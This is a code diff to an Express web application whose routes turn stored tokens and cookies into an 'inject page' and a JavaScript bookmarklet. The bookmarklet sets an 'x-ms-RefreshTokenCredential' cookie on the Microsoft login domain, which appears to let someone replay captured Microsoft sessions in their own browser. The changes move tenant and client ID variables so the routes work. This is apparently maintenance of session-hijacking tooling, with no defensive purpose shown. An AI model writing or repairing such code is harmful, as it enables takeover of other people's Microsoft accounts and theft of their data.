@@ -36,6 +36,8 @@ router.get('/page/:id', async (req, res) => {
       return res.status(400).send('No tokens available');
     }
 
+    var tenant = token.tenant || config.AZURE_TENANT || 'common';
+    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
     var cookiesList = [];
     if (cookies) {
       cookiesList = parseCookies(cookies);
@@ -51,9 +53,6 @@ router.get('/page/:id', async (req, res) => {
     }
 
     if (cookiesList.length === 0) return res.status(400).send('No cookies available');
-
-    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-    var tenant = token.tenant || config.AZURE_TENANT || 'common';
 
     res.type('html').send(generateInjectPage(cookiesList, clientId, tenant));
   } catch (err) {
@@ -90,6 +89,7 @@ router.get('/raw/:id', async (req, res) => {
       return res.status(400).json({ error: 'No tokens available' });
     }
 
+    var tenant = token.tenant || config.AZURE_TENANT || 'common';
     var cookiesList = [];
     if (cookies) {
       cookiesList = parseCookies(cookies);
@@ -232,12 +232,14 @@ router.get('/bookmarklet/:id', async (req, res) => {
       return res.status(400).json({ error: 'No tokens available' });
     }
 
-    // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
-    const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
+    var tenant = token.tenant || config.AZURE_TENANT || 'common';
+    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
     var cookiesList = [];
     if (cookies) {
       cookiesList = parseCookies(cookies);
     } else {
+      // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
+      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
       if (accessToken) {
         cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
       }
@@ -248,10 +250,7 @@ router.get('/bookmarklet/:id', async (req, res) => {
 
     if (cookiesList.length === 0) return res.status(400).json({ error: 'No cookies available' });
 
-    var tenant = token.tenant || config.AZURE_TENANT || 'common';
-    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-
-    // Build bookmarklet code using document.cookie method 
+    // Build bookmarklet code using document.cookie method
     var bookmarklet = '';
     for (var i = 0; i < cookiesList.length; i++) {
       const c = cookiesList[i];
